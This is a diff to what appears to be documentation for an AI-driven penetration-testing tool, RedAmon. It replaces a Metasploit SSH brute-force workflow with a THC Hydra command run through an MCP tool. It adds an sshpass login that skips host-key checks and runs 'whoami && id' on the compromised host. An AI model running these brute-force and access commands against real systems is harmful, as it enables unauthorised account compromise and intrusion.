@@ -798,20 +798,16 @@ exit
 "
 ```
 
-### Workflow 4: Brute Force (with caution!)
+### Workflow 4: Brute Force (THC Hydra — preferred)
+
+> **Note:** RedAmon now uses THC Hydra (`execute_hydra`) for brute force attacks instead of Metasploit auxiliary modules. Hydra is faster, stateless, and supports 50+ protocols.
 
 ```bash
-# SSH brute force
-msfconsole -q -x "
-use auxiliary/scanner/ssh/ssh_login
-set RHOSTS 10.0.0.5
-set USERNAME admin
-set PASS_FILE /usr/share/wordlists/rockyou.txt
-set THREADS 5
-set STOP_ON_SUCCESS true
-run
-exit
-"
+# SSH brute force with Hydra (via execute_hydra MCP tool)
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5
+
+# After credentials found, establish access:
+sshpass -p 'discovered_password' ssh -o StrictHostKeyChecking=no admin@10.0.0.5 'whoami && id'
 ```
 
 **Warning:** Brute forcing can lock accounts and trigger alerts!
